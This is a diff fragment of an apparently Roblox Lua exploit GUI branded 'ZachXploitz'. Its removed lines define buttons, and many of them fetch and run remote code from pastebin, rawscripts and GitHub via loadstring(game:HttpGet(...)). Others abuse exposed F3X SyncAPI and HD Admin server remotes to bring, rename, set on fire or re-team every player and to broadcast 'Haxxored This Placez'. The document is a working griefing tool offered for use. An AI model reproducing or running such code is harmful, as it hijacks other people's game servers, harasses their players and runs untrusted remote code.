-	local script = LMG2L["LocalScript_3"];
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Zaxh69/Project/refs/heads/main/ZachXploitzLogo.txt"))()	
-end;
-task.spawn(C_3);
-local function C_5()
-	local script = LMG2L["LocalScript_5"];
-	local button = script.Parent	
-	local mainFrame = button.Parent	
-	
-	local myFrame = button:WaitForChild("Frame2")	
-	
-	button.MouseButton1Click:Connect(function()	
-		for _, obj in ipairs(mainFrame:GetDescendants()) do	
-			if obj:IsA("Frame") then	
-				obj.Visible = false	
-			end	
-		end	
-			
-		myFrame.Visible = true	
-	end)	
-end;
-task.spawn(C_5);
-local function C_9()
-	local script = LMG2L["LocalScript_9"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-John-Doe-F3X-Script-86500"))()	
-	end)	
-end;
-task.spawn(C_9);
-local function C_c()
-	local script = LMG2L["LocalScript_c"];
-	local button = script.Parent	
-	
-	button.MouseButton1Click:Connect(function()	
-	loadstring(game:HttpGet("https://pastebin.com/3EV59jLS"))()	
-	end)	
-end;
-task.spawn(C_c);
-local function C_f()
-	local script = LMG2L["LocalScript_f"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local player = game.Players.LocalPlayer	
-		local char = player.Character or player.CharacterAdded:Wait()	
-		local tool	
-	
-		for _, v in player:GetDescendants() do	
-			if v.Name == "SyncAPI" then	
-				tool = v.Parent	
-			end	
-		end	
-	
-		for _, v in game.ReplicatedStorage:GetDescendants() do	
-			if v.Name == "SyncAPI" then	
-				tool = v.Parent	
-			end	
-		end	
-	
-		if not tool then return end	
-	
-		local remote = tool.SyncAPI.ServerEndpoint	
-	
-		local function _(args)	
-			remote:InvokeServer(unpack(args))	
-		end	
-	
-		local function CreatePart(cf, parent)	
-			_({"CreatePart","Normal",cf,parent})	
-		end	
-	
-		local function SetAnchor(part, state)	
-			_({"SyncAnchor",{{Part = part, Anchored = state}}})	
-		end	
-	
-		local function AddMesh(part)	
-			_({"CreateMeshes",{{Part = part}}})	
-		end	
-	
-		local function SetMesh(part, meshid)	
-			_({"SyncMesh",{{Part = part, MeshId = "rbxassetid://"..meshid}}})	
-		end	
-	
-		local function SetTexture(part, texid)	
-			_({"SyncMesh",{{Part = part, TextureId = "rbxassetid://"..texid}}})	
-		end	
-	
-		local function MeshResize(part, size)	
-			_({"SyncMesh",{{Part = part, Scale = size}}})	
-		end	
-	
-		local function Sky(id)	
-			local hrp = char:WaitForChild("HumanoidRootPart")	
-			local pos = hrp.Position + Vector3.new(0,6,0)	
-	
-			CreatePart(CFrame.new(pos), workspace)	
-	
-			for _, v in workspace:GetDescendants() do	
-				if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then	
-					SetAnchor(v,true)	
-					AddMesh(v)	
-					SetMesh(v,111891702759441)	
-					SetTexture(v,id)	
-					MeshResize(v,Vector3.new(8000,8000,8000))	
-				end	
-			end	
-		end	
-	
-		Sky("84437077150729")	
-	end)	
-end;
-task.spawn(C_f);
-local function C_12()
-	local script = LMG2L["LocalScript_12"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";bring all")	
-	end)	
-end;
-task.spawn(C_12);
-local function C_15()
-	local script = LMG2L["LocalScript_15"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-	loadstring(game:HttpGet("https://pastebin.com/raw/MjRdFbN7"))()	
-	end)	
-end;
-task.spawn(C_15);
-local function C_18()
-	local script = LMG2L["LocalScript_18"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		loadstring(game:HttpGet("https://pastebin.com/raw/8msENFDp"))()	
-	end)	
-end;
-task.spawn(C_18);
-local function C_1b()
-	local script = LMG2L["LocalScript_1b"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-			local player = game.Players.LocalPlayer	
-		local char = player.Character or player.CharacterAdded:Wait()	
-		local tool	
-	
-		for _, v in player:GetDescendants() do	
-			if v.Name == "SyncAPI" then	
-				tool = v.Parent	
-			end	
-		end	
-	
-		for _, v in game.ReplicatedStorage:GetDescendants() do	
-			if v.Name == "SyncAPI" then	
-				tool = v.Parent	
-			end	
-		end	
-	
-		if not tool then return end	
-	
-		local remote = tool.SyncAPI.ServerEndpoint	
-	
-		local function _(args)	
-			remote:InvokeServer(unpack(args))	
-		end	
-	
-		local function CreatePart(cf, parent)	
-			_({"CreatePart","Normal",cf,parent})	
-		end	
-	
-		local function SetAnchor(part, state)	
-			_({"SyncAnchor",{{Part = part, Anchored = state}}})	
-		end	
-	
-		local function AddMesh(part)	
-			_({"CreateMeshes",{{Part = part}}})	
-		end	
-	
-		local function SetMesh(part, meshid)	
-			_({"SyncMesh",{{Part = part, MeshId = "rbxassetid://"..meshid}}})	
-		end	
-	
-		local function SetTexture(part, texid)	
-			_({"SyncMesh",{{Part = part, TextureId = "rbxassetid://"..texid}}})	
-		end	
-	
-		local function MeshResize(part, size)	
-			_({"SyncMesh",{{Part = part, Scale = size}}})	
-		end	
-	
-		local function Sky(id)	
-			local hrp = char:WaitForChild("HumanoidRootPart")	
-			local pos = hrp.Position + Vector3.new(0,6,0)	
-	
-			CreatePart(CFrame.new(pos), workspace)	
-	
-			for _, v in workspace:GetDescendants() do	
-				if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then	
-					SetAnchor(v,true)	
-					AddMesh(v)	
-					SetMesh(v,111891702759441)	
-					SetTexture(v,id)	
-					MeshResize(v,Vector3.new(8000,8000,8000))	
-				end	
-			end	
-		end	
-	
-		Sky("79440497150256")	
-	end)	
-end;
-task.spawn(C_1b);
-local function C_1e()
-	local script = LMG2L["LocalScript_1e"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";name all ZachXploitz")	
-	end)	
-end;
-task.spawn(C_1e);
-local function C_21()
-	local script = LMG2L["LocalScript_21"];
-	local button = script.Parent	
-	
-	button.MouseButton1Click:Connect(function()	
-	loadstring(game:HttpGet("https://pastebin.com/raw/7t1TS2z1"))()	
-	end)	
-end;
-task.spawn(C_21);
-local function C_24()
-	local script = LMG2L["LocalScript_24"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";disco ;time 0  ;fog 400")	
-	end)	
-end;
-task.spawn(C_24);
-local function C_27()
-	local script = LMG2L["LocalScript_27"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";cmdbar2")	
-	end)	
-end;
-task.spawn(C_27);
-local function C_2a()
-	local script = LMG2L["LocalScript_2a"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";sm ZachXploitz Haxxored This Placez!!1")	
-	end)	
-end;
-task.spawn(C_2a);
-local function C_2d()
-	local script = LMG2L["LocalScript_2d"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";createTeam blue ZachXploitz")	
-	    RequestCommand:InvokeServer(";team all ZachXploitz")	
-	end)	
-end;
-task.spawn(C_2d);
-local function C_30()
-	local script = LMG2L["LocalScript_30"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";time 10")	
-	end)	
-end;
-task.spawn(C_30);
-local function C_33()
-	local script = LMG2L["LocalScript_33"];
-	local button = script.Parent	
-	
-	button.MouseButton1Click:Connect(function()	
-	loadstring(game:HttpGet("https://pastebin.com/raw/zg8JUa13"))()	
-	end)	
-end;
-task.spawn(C_33);
-local function C_36()
-	local script = LMG2L["LocalScript_36"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";gear me 116693764")	
-	end)	
-end;
-task.spawn(C_36);
-local function C_39()
-	local script = LMG2L["LocalScript_39"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";fire all")	
-	end)	
-end;
-task.spawn(C_39);
-local function C_3c()
-	local script = LMG2L["LocalScript_3c"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
-		local RequestCommand = hd.Signals.RequestCommandSilent	
-	
-		RequestCommand:InvokeServer(";char all KyuKusangaki")	
-	end)	
-end;
-task.spawn(C_3c);
-local function C_3f()
-	local script = LMG2L["LocalScript_3f"];
-	local button = script.Parent	
-	
-	button.MouseButton1Click:Connect(function()	
-		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-mesh-disco-f3x-client-sided-93981"))()	
-	end)	
-end;
-task.spawn(C_3f);
-local function C_42()
-	local script = LMG2L["LocalScript_42"];
-	local Button = script.Parent	
-	
-	Button.MouseButton1Click:Connect(function()	
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")	
-		local hd = ReplicatedStorage:Wa)	
+		RequestCommand:InvokeServer(";music 1839246774 ;pitch 1.1 ;volume inf")	
 	end)	
 end;
 task.spawn(C_7f);
@@ -3019,4 +3016,4 @@ local function C_d5()
 end;
 task.spawn(C_d5);
 
-return LMG2L["Gui_1"], require;
+return LMG2L["ScreenGui_1"], require;
